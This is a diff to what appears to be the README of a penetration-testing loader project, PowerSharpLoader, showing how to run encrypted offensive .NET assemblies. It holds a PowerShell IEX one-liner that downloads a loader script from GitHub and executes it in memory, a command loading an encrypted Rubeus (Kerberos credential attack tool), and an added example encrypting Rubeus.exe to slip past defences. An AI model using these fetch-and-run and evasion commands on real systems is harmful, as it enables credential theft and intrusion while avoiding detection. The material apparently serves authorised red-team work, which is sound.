@@ -270,5 +270,12 @@ Invoke-Expression $ldrcommand
 ```
 IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssemblyAESLocal.ps1"));
 Invoke-LoadAssemblyXORLocal -AssemblyPath "C:\\Windows\\Tasks\\rubeus_aes.enc" -KeyString "Me0w_key_Me0w" -Command "hash /password:test"
+```
 
+To encrypt an assembly binary:
+
+```
+┌──(root㉿spiderlabs-pentest)-[/root/myCodes/aes_encryptor]
+└─PS> ./aes_enc.ps1 -InputFilePath "/var/www/html/windows/Rubeus.exe" -OutputFilePath "/root/myCodes/aes_encryptor/rubeus_aes.enc" -Password "Me0w_key_Me0w"                  
+Encryption complete. Encrypted file saved to /root/myCodes/aes_encryptor/rubeus_aes.enc
 ```
